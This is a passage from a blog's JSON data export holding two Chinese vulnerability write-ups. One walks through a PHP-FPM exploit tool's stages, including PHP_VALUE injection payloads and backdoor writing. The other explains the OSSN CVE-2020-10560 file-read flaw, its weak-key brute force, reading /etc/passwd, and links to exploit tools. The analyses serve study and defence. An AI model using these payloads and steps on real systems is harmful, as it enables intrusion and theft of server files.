alt=\"Kvq3FO.md.png\"></a></p>\n<p>发包次数：</p>\n<p>10次</p>\n<p>补位数据个数：</p>\n<p>Q个数1949、等号个数256</p>\n<p>Payload:</p>\n<p>/PHP\\nSOSAT</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/Kvq8YD\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvq8YD.md.png\" alt=\"Kvq8YD.md.png\"></a></p>\n<p>作用：</p>\n<p>进行sanity check<br>操作，当此处数据包返回状态码与baseStatus值相同，且header头部不存在包含PHPSESSID字符串的set-cookie字段时，通过检测，反之，程序结束</p>\n<p>详情：</p>\n<p>SanityCheck方法在Detect方法中调用,如下图</p>\n<p><a href=\"https://imgchr.com/i/KvqGfe\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqGfe.md.png\" alt=\"KvqGfe.md.png\"></a></p>\n<p>可见此处也存在一个for循环，最多可以循环发包10次</p>\n<p><a href=\"https://imgchr.com/i/KvqYSH\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqYSH.md.png\" alt=\"KvqYSH.md.png\"></a></p>\n<p>SanityCheck方法仍然调用RequestWithQueryStringPrefix方法，</p>\n<p>此时pathInfo为”/PHP\\nSOSAT”，params.PisosLength值为256，补256个等号</p>\n<p>循环发送10次</p>\n<p><a href=\"https://imgchr.com/i/Kvqtld\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvqtld.md.png\" alt=\"Kvqtld.md.png\"></a></p>\n<p>检测sanity部分代码如下</p>\n<p><a href=\"https://imgchr.com/i/KvqN6A\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqN6A.md.png\" alt=\"KvqN6A.md.png\"></a></p>\n<h3 id=\"Q字符长度以及等号个数确认阶段\"><a href=\"#Q字符长度以及等号个数确认阶段\" class=\"headerlink\" title=\"Q字符长度以及等号个数确认阶段\"></a>Q字符长度以及等号个数确认阶段</h3><p>发送位置：</p>\n<p>位于detect.go 96行</p>\n<p><a href=\"https://imgchr.com/i/KvqUOI\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqUOI.md.png\" alt=\"KvqUOI.md.png\"></a></p>\n<p>发包次数：</p>\n<p>最大50*3*256次，当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串时终止发包</p>\n<p>补位数据个数：</p>\n<p>Q个数qslCandidates -1/ qslCandidates -5 -1/ qslCandidates -10 -1<br>随中层三次循环变化、等号个数1-256随内层循环变化</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/Kvqdmt\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvqdmt.md.png\" alt=\"Kvqdmt.md.png\"></a></p>\n<p><a href=\"https://imgchr.com/i/Kvqw0P\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvqw0P.md.png\" alt=\"Kvqw0P.md.png\"></a></p>\n<p><a href=\"https://imgchr.com/i/Kvq0Tf\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvq0Tf.md.png\" alt=\"Kvq0Tf.md.png\"></a></p>\n<p>作用：</p>\n<p>分别尝试Q的个数为qslCandidates-1长度、qslCandidates-5-1、qslCandidates-10-1长度下，等号个数从1到256的请求的不同效果。</p>\n<p>找到当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串时，对应的Q个数以及等号个数，共后续攻击利用</p>\n<p>详情：</p>\n<p>此处发包位于Detect方法中96行处</p>\n<p><a href=\"https://imgchr.com/i/KvqDk8\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqDk8.md.png\" alt=\"KvqDk8.md.png\"></a></p>\n<p>可见存在一个三层嵌套循环</p>\n<p>外层for循环50次，中层循环3次，内层循环256次</p>\n<p>在内层循环里，即上图96行处，仍然使用RequestWithQueryStringPrefix方法发包</p>\n<p>Payload值获取于Detect方法中87行处的MakePathInfo方法中,如下图</p>\n<p><a href=\"https://imgchr.com/i/KvqrtS\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqrtS.md.png\" alt=\"KvqrtS.md.png\"></a></p>\n<p>传入MakePathInfo方法中的值为method.PHPOptionEnable</p>\n<p><a href=\"https://imgchr.com/i/Kvqsfg\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvqsfg.md.png\" alt=\"Kvqsfg.md.png\"></a></p>\n<p>即session.auto_start=1</p>\n<p>在MakePathInfo方法中，将传入的phpValue参数值前拼接/PHP_VALUE\\n，并赋值pi</p>\n<p><a href=\"https://imgchr.com/i/Kvq6pQ\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvq6pQ.md.png\" alt=\"Kvq6pQ.md.png\"></a></p>\n<p>计算PosOffset值(固定34)与pi长度差并在pi后拼接对应长度差个数的;如下图</p>\n<p><a href=\"https://imgchr.com/i/Kvqclj\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvqclj.md.png\" alt=\"Kvqclj.md.png\"></a></p>\n<p>最终payload即pathInfo为/PHP_VALUE\\nsession.auto_start=1;;;</p>\n<p>params.QueryStringLength值与params.PisosLength值获取于Detect方法中95行处qsl与pl，如下图</p>\n<p><a href=\"https://imgchr.com/i/Kvqg6s\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvqg6s.md.png\" alt=\"Kvqg6s.md.png\"></a></p>\n<p>qsl值为中层循环时遍历数组qslCandidates中的值，qslCandidates中的值如下图，分别为1785/1790/1795，这个列表值是由Q字符长度候选值确认阶段计算的候选Q长度值减5以及减10得来</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/04/Kvq2Xn.png\" alt=\"Kvq2Xn.png\"></p>\n<p>Pl值为内层循环时遍历数组plCandidates中的值，plCandidates中的值如下图，分别为1-256</p>\n<p><a href=\"https://imgchr.com/i/Kvqf00\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvqf00.md.png\" alt=\"Kvqf00.md.png\"></a></p>\n<p>会随着内层循环从0递增，因此最终补充的等号个数逐渐从1个随发包递增-置1-递增。</p>\n<p>params.QueryStringLength值获取与</p>\n<p>当返回值满足如下if分支时，循环结束</p>\n<p><a href=\"https://imgchr.com/i/Kvq5kT\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvq5kT.md.png\" alt=\"Kvq5kT.md.png\"></a></p>\n<p>跟入method.Check方法，如下图</p>\n<p><a href=\"https://imgchr.com/i/KvqItU\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqItU.md.png\" alt=\"KvqItU.md.png\"></a></p>\n<p>当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串，则method.Check方法返回true，循环终止。返回params值(params.PisosLength/params.QueryStringLength)共后续发包使用</p>\n<p>满足条件的数据包如下</p>\n<p><a href=\"https://imgchr.com/i/KvqohF\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqohF.md.png\" alt=\"KvqohF.md.png\"></a></p>\n<p>当三层循环完全结束后，仍无满足条件的响应数据包，程序返回not vulnerable or other<br>failure</p>\n<p>当该过程结束后，会再次发送50个数据包，试图将session.auto_start设置回0</p>\n<h3 id=\"修改PHP-ini阶段\"><a href=\"#修改PHP-ini阶段\" class=\"headerlink\" title=\"修改PHP.ini阶段\"></a>修改PHP.ini阶段</h3><p>发送位置：</p>\n<p>位于attack.go 33行</p>\n<p><a href=\"https://imgchr.com/i/Kvq7p4\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvq7p4.md.png\" alt=\"Kvq7p4.md.png\"></a></p>\n<p>发包次数：</p>\n<p>不定，直到响应数据包body中存在”/bin/which”字符串后停止发包</p>\n<p>补位数据个数：</p>\n<p>Q个数以及等号个数由上一阶段(Q字符长度以及等号个数确认阶段)确定</p>\n<p>Payload:</p>\n<p>循环发送chain数组值</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/KvqH1J\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqH1J.md.png\" alt=\"KvqH1J.md.png\"></a></p>\n<p>作用：</p>\n<p>修改php.ini</p>\n<p>详情：</p>\n<p>Attack方法位于main.go 103行被调用，接收上一阶段得出的params值进行payload计算</p>\n<p><a href=\"https://imgchr.com/i/Kvqbc9\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvqbc9.md.png\" alt=\"Kvqbc9.md.png\"></a></p>\n<p>跟入Attack方法</p>\n<p><a href=\"https://imgchr.com/i/KvqqXR\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqqXR.md.png\" alt=\"KvqqXR.md.png\"></a></p>\n<p>可见存在两大段for循环块</p>\n<p>首先看第一段for循环，该处for循环中嵌套一层循环</p>\n<p><a href=\"https://imgchr.com/i/KvqOn1\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqOn1.md.png\" alt=\"KvqOn1.md.png\"></a></p>\n<p>从chain中取payload，并传递给SetSettingSingle发包</p>\n<p>Chain值如下</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/04/KvqX0x.png\" alt=\"KvqX0x.png\"></p>\n<p>SetSettingSingle方法</p>\n<p><a href=\"https://imgchr.com/i/Kvqj76\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvqj76.md.png\" alt=\"Kvqj76.md.png\"></a></p>\n<p>SetSettingSingle方法首先调用MakePathInfo处理payload，如上图29行，接着调用RequestWithQueryStringPrefix方法发包</p>\n<p>此时PathInfo值为<br>/PHP_VALUE/nsession.auto_start=0;;;形式，其中session.auto_start=0为遍历chain中值</p>\n<p>其中Q的个数与等号个数，又上一步返回的params值来计算</p>\n<p>发包结果如下</p>\n<p><a href=\"https://imgchr.com/i/KvqxAK\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqxAK.md.png\" alt=\"KvqxAK.md.png\"></a></p>\n<p><img src=\"https://s2.ax1x.com/2019/11/04/KvqztO.png\" alt=\"KvqztO.png\"></p>\n<p>只有当返回body中存在successPattern值时，最外层for循环才会结束，否则一直循环发送chain中的值。如下图</p>\n<p><a href=\"https://imgchr.com/i/KvLShD\"><img src=\"https://s2.ax1x.com/2019/11/04/KvLShD.md.png\" alt=\"KvLShD.md.png\"></a></p>\n<p>successPattern 值为”/bin/which”，如下图</p>\n<p><a href=\"https://imgchr.com/i/KvL99e\"><img src=\"https://s2.ax1x.com/2019/11/04/KvL99e.md.png\" alt=\"KvL99e.md.png\"></a></p>\n<p>最终结束时的返回包如下</p>\n<p><a href=\"https://imgchr.com/i/KvLC1H\"><img src=\"https://s2.ax1x.com/2019/11/04/KvLC1H.md.png\" alt=\"KvLC1H.md.png\"></a></p>\n<h3 id=\"写入后门阶段\"><a href=\"#写入后门阶段\" class=\"headerlink\" title=\"写入后门阶段\"></a>写入后门阶段</h3><p>发送位置：</p>\n<p>位于attack.go 48行</p>\n<p><a href=\"https://imgchr.com/i/KvLPcd\"><img src=\"https://s2.ax1x.com/2019/11/04/KvLPcd.md.png\" alt=\"KvLPcd.md.png\"></a></p>\n<p>发包次数：</p>\n<p>不定，直到响应数据包body中存在”/bin/which”字符串后停止发包</p>\n<p>补位数据个数：</p>\n<p>Q个数以及等号个数由Q字符长度以及等号个数确认阶段确定</p>\n<p>Payload:</p>\n<p>/</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/KvLijA\"><img src=\"https://s2.ax1x.com/2019/11/04/KvLijA.md.png\" alt=\"KvLijA.md.png\"></a></p>\n<p>作用：</p>\n<p>清空tmp\\a，并在tmp\\a中写入payload</p>\n<p>详情：</p>\n<p>此处发包位于Attack方法中的第二个for循环块</p>\n<p><a href=\"https://imgchr.com/i/KvLknI\"><img src=\"https://s2.ax1x.com/2019/11/04/KvLknI.md.png\" alt=\"KvLknI.md.png\"></a></p>\n<p>同上一个(修改PHP.ini阶段)相似，也是调用RequestWithQueryStringPrefix方法发包</p>\n<p>此时PathInfo值为”/”，<br>params值使用的是由Q字符长度以及等号个数确认阶段中得出的params值</p>\n<p>发包结果如下</p>\n<p><a href=\"https://imgchr.com/i/KvLABt\"><img src=\"https://s2.ax1x.com/2019/11/04/KvLABt.md.png\" alt=\"KvLABt.md.png\"></a></p>\n<p>当返回body中存在/bin/which时，发包结束</p>"},{"title":"Rand函数引发的安全问题 —— OSSN任意文件读取漏洞（CVE-2020-10560）","date":"2020-04-29T09:22:07.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n前言\n----\n\nOpen Source Social Network（OSSN），是一款用PHP编写的社交网络软件。OSSN允许用户创建一个社交网站，帮助拥有相似专业或个人兴趣的人建立社交关系。该软件拥有约50万下载量。\n\nOSSN官网地址：\n\nhttps://www.opensource-socialnetwork.org/\n\n\n\n漏洞简介\n--------\n\nOpen Source Social Network(OSSN)5.3之前版本中存在一处任意文件读取漏洞（CVE-2020-10560）。漏洞因OSSN生成的Site_Key强度过低从而可以遭受被暴力破解而产生，成功破解Site_Key的攻击者可以利用Site_Key构造出任意文件读取链接，通过components\\\\OssnComments\\\\ossn_com.php文件提供的文件预览接口，读取文件。\n\n\n\n漏洞分析\n--------\n\nOpen Source Social Network应用可以从如下官网链接下载：\n\nhttps://www.opensource-socialnetwork.org/download\n\n应用首页如下图\n\n![50d06cd2341f3f224e00c90680c04951.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422115537-204ff9e2-844d-1.png)\n\nOSSN中提供Comment功能，访问者可以对帖子进行评论，见下图:\n\n![7dc3d46cf96aef374ffe5a4c290aeeee.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422115805-78240802-844d-1.png)\n\n评论帖子时，用户可以上传图片以及表情，如下图红框处：\n\n![6def8f79ff49c6d50164ecd2584b39e3.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422115855-9609c852-844d-1.png)\n\n当选择本地图片并上传后，将在评论中生成一个预览，见下图：\n\n![74ddff9e63efe6f222744c21fd3b5c73.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422115924-a78fc87e-844d-1.png)\n\n注意，这时还没有点击发布评论，上图图片只是上传成功后的一个预览图片。该临时图像文件存储于tmp目录并在前端呈现了预览。\n\n我们来看下这个临时图片文件是如何获取并在页面中展示的。查看一下图片链接，如下图：\n\n![756fd3bdade936aa990e465e35f73696.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422115956-ba4a24dc-844d-1.png)\n\n链接如下：\n\nhttp://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==\n\n我们可以猜测出image参数对应的字符串应该是文件地址的加密形式，只有构造出正确的base64字符串，攻击者就可以读取任意文件。\n\n最重要的是，经过测试发现，访问这个链接并不需要用户登陆。任何人都可以通过这个链接直接访问我们上传的这个图片文件。\n\n接下来分析下后台代码，看看这个base64字符串是如何还原出文件路径以及如何被构造出来的\n\n上文链接对应的后台代码位于 \\\\components\\\\OssnComments\\\\ossn_com.php\n\n![9cc87cd2dd240d12ffce6b51dc20d281.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120030-cef58336-844d-1.png)\n\n在ossn_com.php中case 'staticimage'分支里，程序将请求中image参数值取出，并进行base64_decode解码。见下图：\n\n![405ee5b069a8f48aa34075675dd43791.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120057-df0c69ce-844d-1.png)\n\n随后，对解码后的值再次base64_decode解码，然后利用ossn_string_decrypt方法解码并获取文件地址。见下图：\n\n![9f124d799644dd8379456b7bf34da041.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120121-ed0884a4-844d-1.png)\n\n接着，通过ossn_validate_filepath方法对文件路径进行校验。见下图红框：\n\n![450366a18864663e2d312f7d5559b982.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120159-03917424-844e-1.png)\n\nossn_validate_filepath方法如下图所示，可见该方法对目录遍历进行了过滤\n\n![771b3d4d6d708593496a6fdee488540d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120230-1610ce9c-844e-1.png)\n\n即使过滤了../ 我们仍然可以通过绝对路径来进行文件读取，例如直接读取/etc/passwd\n\n最后，程序利用file_get_contents方法对文件内容进行读取，并使用echo进行打印。见下图红框：\n\n![92a6b7bac377cefab4be10fd5a3c24b5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120258-26c89bde-844e-1.png)\n\n通过阅读代码也可以验证之前的测试结果：该接口并未进行身份校验，未登录的用户依然可以通过该接口访问文件。\n\n问题又回到了如何构造加密字符串上。我们首先来看一下程序是如何解码的，位于libraries\\\\ossn.lib.system.php文件中\n\n![f27e6686c487d647ab145caa56fffc12.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120324-36909b7a-844e-1.png)\n\n通过上图的代码看，在解码过程中，需要用到site_key值。\n\n经过分析后发现，程序通过ossn_site_settings方法在数据库中读取site_key值，我们先来看一下存储于ossn_site_settings表中site_key值是什么，见下图：\n\n![5e893725ffa5b9ec4fb5de1ebb0e9392.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120346-4365dc70-844e-1.png)\n\nsite_key值为c1a725ed，可见是一个8位数\n\n这样看来，只要破解出这个8位数的site_key，即可构造出指向任意文件路径的链接。\n\n我们接着分析这个site_key是如何生成的，生成代码位于libraries\\\\ossn.lib.upgrade.php文件中，见下图：\n\n![2323dd84d59c7e27fec7ca929f0676da.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120409-516ddc64-844e-1.png)\n\n通过分析上图加密过程不难发现，该8位随机数是通过如下方式产生的：\n\n1.  以字符串“ ossn”开头。\n\n2.  通过rand方法生成一个随机数并拼接到“ ossn”字符串后。\n\n3.  计算此字符串的md5值。\n\n4.  将字符3-11取出作为site_key值。\n\n本次漏洞就出在计算site_key值的第二步，也就是通过rand产生随机数这一步。\n\n关于rand方法，可以参考php官网\n\n![63dc236aec956222c70176bff1f7a1e0.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120438-62894a56-844e-1.png)\n\n在官网介绍页面中明确的给出了警告，见上图底部\n\n**警告**\n\n此函数不会生成加密安全值，并且不应将其用于加密目的。如果需要密码安全的值，请考虑改用random_int(),random_bytes()或openssl_random_pseudo_bytes()。\n\nrand方法之所以不安全，其中一个比较重要的原因是它能产生的随机数范围有限:\n\nrand方法在没有提供可选参数 *min* 和 *max*时，返回 0 到 RAND_MAX之间的伪随机整数.\n\n在笔者的windows主机上，RAND_MAX值仅为32767\n\n![0b5acd2f6a7375ba756752852bc7e44a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120504-721b9578-844e-1.png)\n\n而在笔者的Linux环境中，这个值为2147483647\n\n![6e6e0dfcc665126d10a8993caac307b3.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120534-84486212-844e-1.png)\n\n据资料显示，rand最大可能值为2,147,483,647\n\n因此，只需要生成最多20亿个rand值，将其依次带入ossn_generate_site_secret计算出对应的site_key值，这些site_key值即为所有的site_key值可能值。如果运气好，目标主机是一台windows主机，这样的操作仅仅重复3万多次即可，因为windows主机下rand产生的最大值仅为32767。\n\n在分析了弱密钥是如何生成之后，我们需要一种方法来识别生成的密钥是否有效。在临时图片文件被上传到服务器时，会被存储于ossn_data/tmp/photos文件夹中，见下图：\n\n![1cbb4812f7c772c5ec634b0387a39236.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120602-94bd4eb4-844e-1.png)\n\n因此上文中的加密数据成功解码后，其字符串中一定会包含tmp/photos字符串。我们这里用我们的密钥解一下上文中的编码，看一下这个推论是否正确，结果如下图：\n\n![c06df9d005258df8bba4822aa286fb61.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120727-c7548450-844e-1.png)\n\n可见成功解开的文件路径中的确存在tmp/photos字符串\n\n因此，暴力破解的思路很明朗了\n\n1、攻击者在评论里上传一个图片，不点击发送，查看此时图片临时预览链接，获取链接中image参数值。例如：<http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==>中的UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==>\n\n2、将数字0-2147483647依次带入ossn_generate_site_secret中计算出对应的site_key\n\n3、依次将site_key与image值带入ossn_string_decrypt中，获取解密后的明文\n\n4、如果明文中含有tmp/photos字符串，解密成功，此时的site_key即为正确的site_key值\n\n漏洞利用\n--------\n\n在获取site_key值后，可以通过ossn_string_encrypt方法，对想要读取的文件进行加密，通过<http://192.167.30.119/comment/staticimage?image=>接口进行读取即可\n\n上文所涉及的工具如下：\n\nsite_key计算工具\n\n<https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery>\n\n加密解密工具\n\nhttps://github.com/kevthehermit/CVE-2020-10560","source":"_posts/OSSN-CVE-2020-10560.md","raw":"---\ntitle: Rand函数引发的安全问题 —— OSSN任意文件读取漏洞（CVE-2020-10560）\ntags: web漏洞分析\ncategories: 技术\n\ndate: 2020-04-29 17:22:07\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n前言\n----\n\nOpen Source Social Network（OSSN），是一款用PHP编写的社交网络软件。OSSN允许用户创建一个社交网站，帮助拥有相似专业或个人兴趣的人建立社交关系。该软件拥有约50万下载量。\n\nOSSN官网地址：\n\nhttps://www.opensource-socialnetwork.org/\n\n\n\n漏洞简介\n--------\n\nOpen Source Social Network(OSSN)5.3之前版本中存在一处任意文件读取漏洞（CVE-2020-10560）。漏洞因OSSN生成的Site_Key强度过低从而可以遭受被暴力破解而产生，成功破解Site_Key的攻击者可以利用Site_Key构造出任意文件读取链接，通过components\\\\OssnComments\\\\ossn_com.php文件提供的文件预览接口，读取文件。\n\n\n\n漏洞分析\n--------\n\nOpen Source Social Network应用可以从如下官网链接下载：\n\nhttps://www.opensource-socialnetwork.org/download\n\n应用首页如下图\n\n![50d06cd2341f3f224e00c90680c04951.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422115537-204ff9e2-844d-1.png)\n\nOSSN中提供Comment功能，访问者可以对帖子进行评论，见下图:\n\n![7dc3d46cf96aef374ffe5a4c290aeeee.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422115805-78240802-844d-1.png)\n\n评论帖子时，用户可以上传图片以及表情，如下图红框处：\n\n![6def8f79ff49c6d50164ecd2584b39e3.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422115855-9609c852-844d-1.png)\n\n当选择本地图片并上传后，将在评论中生成一个预览，见下图：\n\n![74ddff9e63efe6f222744c21fd3b5c73.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422115924-a78fc87e-844d-1.png)\n\n注意，这时还没有点击发布评论，上图图片只是上传成功后的一个预览图片。该临时图像文件存储于tmp目录并在前端呈现了预览。\n\n我们来看下这个临时图片文件是如何获取并在页面中展示的。查看一下图片链接，如下图：\n\n![756fd3bdade936aa990e465e35f73696.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422115956-ba4a24dc-844d-1.png)\n\n链接如下：\n\nhttp://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==\n\n我们可以猜测出image参数对应的字符串应该是文件地址的加密形式，只有构造出正确的base64字符串，攻击者就可以读取任意文件。\n\n最重要的是，经过测试发现，访问这个链接并不需要用户登陆。任何人都可以通过这个链接直接访问我们上传的这个图片文件。\n\n接下来分析下后台代码，看看这个base64字符串是如何还原出文件路径以及如何被构造出来的\n\n上文链接对应的后台代码位于 \\\\components\\\\OssnComments\\\\ossn_com.php\n\n![9cc87cd2dd240d12ffce6b51dc20d281.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120030-cef58336-844d-1.png)\n\n在ossn_com.php中case 'staticimage'分支里，程序将请求中image参数值取出，并进行base64_decode解码。见下图：\n\n![405ee5b069a8f48aa34075675dd43791.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120057-df0c69ce-844d-1.png)\n\n随后，对解码后的值再次base64_decode解码，然后利用ossn_string_decrypt方法解码并获取文件地址。见下图：\n\n![9f124d799644dd8379456b7bf34da041.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120121-ed0884a4-844d-1.png)\n\n接着，通过ossn_validate_filepath方法对文件路径进行校验。见下图红框：\n\n![450366a18864663e2d312f7d5559b982.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120159-03917424-844e-1.png)\n\nossn_validate_filepath方法如下图所示，可见该方法对目录遍历进行了过滤\n\n![771b3d4d6d708593496a6fdee488540d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120230-1610ce9c-844e-1.png)\n\n即使过滤了../ 我们仍然可以通过绝对路径来进行文件读取，例如直接读取/etc/passwd\n\n最后，程序利用file_get_contents方法对文件内容进行读取，并使用echo进行打印。见下图红框：\n\n![92a6b7bac377cefab4be10fd5a3c24b5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120258-26c89bde-844e-1.png)\n\n通过阅读代码也可以验证之前的测试结果：该接口并未进行身份校验，未登录的用户依然可以通过该接口访问文件。\n\n问题又回到了如何构造加密字符串上。我们首先来看一下程序是如何解码的，位于libraries\\\\ossn.lib.system.php文件中\n\n![f27e6686c487d647ab145caa56fffc12.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120324-36909b7a-844e-1.png)\n\n通过上图的代码看，在解码过程中，需要用到site_key值。\n\n经过分析后发现，程序通过ossn_site_settings方法在数据库中读取site_key值，我们先来看一下存储于ossn_site_settings表中site_key值是什么，见下图：\n\n![5e893725ffa5b9ec4fb5de1ebb0e9392.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120346-4365dc70-844e-1.png)\n\nsite_key值为c1a725ed，可见是一个8位数\n\n这样看来，只要破解出这个8位数的site_key，即可构造出指向任意文件路径的链接。\n\n我们接着分析这个site_key是如何生成的，生成代码位于libraries\\\\ossn.lib.upgrade.php文件中，见下图：\n\n![2323dd84d59c7e27fec7ca929f0676da.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120409-516ddc64-844e-1.png)\n\n通过分析上图加密过程不难发现，该8位随机数是通过如下方式产生的：\n\n1.  以字符串“ ossn”开头。\n\n2.  通过rand方法生成一个随机数并拼接到“ ossn”字符串后。\n\n3.  计算此字符串的md5值。\n\n4.  将字符3-11取出作为site_key值。\n\n本次漏洞就出在计算site_key值的第二步，也就是通过rand产生随机数这一步。\n\n关于rand方法，可以参考php官网\n\n![63dc236aec956222c70176bff1f7a1e0.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120438-62894a56-844e-1.png)\n\n在官网介绍页面中明确的给出了警告，见上图底部\n\n**警告**\n\n此函数不会生成加密安全值，并且不应将其用于加密目的。如果需要密码安全的值，请考虑改用random_int(),random_bytes()或openssl_random_pseudo_bytes()。\n\nrand方法之所以不安全，其中一个比较重要的原因是它能产生的随机数范围有限:\n\nrand方法在没有提供可选参数 *min* 和 *max*时，返回 0 到 RAND_MAX之间的伪随机整数.\n\n在笔者的windows主机上，RAND_MAX值仅为32767\n\n![0b5acd2f6a7375ba756752852bc7e44a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120504-721b9578-844e-1.png)\n\n而在笔者的Linux环境中，这个值为2147483647\n\n![6e6e0dfcc665126d10a8993caac307b3.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120534-84486212-844e-1.png)\n\n据资料显示，rand最大可能值为2,147,483,647\n\n因此，只需要生成最多20亿个rand值，将其依次带入ossn_generate_site_secret计算出对应的site_key值，这些site_key值即为所有的site_key值可能值。如果运气好，目标主机是一台windows主机，这样的操作仅仅重复3万多次即可，因为windows主机下rand产生的最大值仅为32767。\n\n在分析了弱密钥是如何生成之后，我们需要一种方法来识别生成的密钥是否有效。在临时图片文件被上传到服务器时，会被存储于ossn_data/tmp/photos文件夹中，见下图：\n\n![1cbb4812f7c772c5ec634b0387a39236.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120602-94bd4eb4-844e-1.png)\n\n因此上文中的加密数据成功解码后，其字符串中一定会包含tmp/photos字符串。我们这里用我们的密钥解一下上文中的编码，看一下这个推论是否正确，结果如下图：\n\n![c06df9d005258df8bba4822aa286fb61.png](https://xzfile.aliyuncs.com/media/upload/picture/20200422120727-c7548450-844e-1.png)\n\n可见成功解开的文件路径中的确存在tmp/photos字符串\n\n因此，暴力破解的思路很明朗了\n\n1、攻击者在评论里上传一个图片，不点击发送，查看此时图片临时预览链接，获取链接中image参数值。例如：<http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==>中的UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==>\n\n2、将数字0-2147483647依次带入ossn_generate_site_secret中计算出对应的site_key\n\n3、依次将site_key与image值带入ossn_string_decrypt中，获取解密后的明文\n\n4、如果明文中含有tmp/photos字符串，解密成功，此时的site_key即为正确的site_key值\n\n漏洞利用\n--------\n\n在获取site_key值后，可以通过ossn_string_encrypt方法，对想要读取的文件进行加密，通过<http://192.167.30.119/comment/staticimage?image=>接口进行读取即可\n\n上文所涉及的工具如下：\n\nsite_key计算工具\n\n<https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery>\n\n加密解密工具\n\nhttps://github.com/kevthehermit/CVE-2020-10560","slug":"OSSN-CVE-2020-10560","published":1,"updated":"2020-10-27T09:27:09.683Z","_id":"ckgrozu8o001bwsa91b31